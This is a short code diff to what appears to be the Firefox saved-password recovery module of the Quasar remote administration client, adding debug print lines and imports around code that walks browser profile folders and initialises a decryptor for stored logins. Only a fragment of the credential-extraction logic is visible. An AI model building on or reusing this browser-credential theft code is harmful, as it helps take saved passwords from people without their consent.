@@ -1,8 +1,10 @@
 ﻿using Quasar.Client.Helper;
 using Quasar.Client.Recovery.Utilities;
 using Quasar.Common.Models;
+using SharpDX.Direct3D11;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Runtime.Serialization;
 
@@ -22,6 +24,7 @@ namespace Quasar.Client.Recovery.Browsers
 
             foreach (string dir in dirs)
             {
+                Debug.WriteLine(dir);
                 string signonsFile = string.Empty;
                 string loginsFile = string.Empty;
                 bool signonsFound = false;
@@ -45,7 +48,10 @@ namespace Quasar.Client.Recovery.Browsers
                 {
                     using (var decrypter = new FFDecryptor())
                     {
+                        Debug.WriteLine("----------------------");
                         var r = decrypter.Init(dir);
+                        Debug.WriteLine(dir);
+                        Debug.WriteLine("----------------------");
                         if (signonsFound)
                         {
                             SQLiteHandler sqlDatabase;
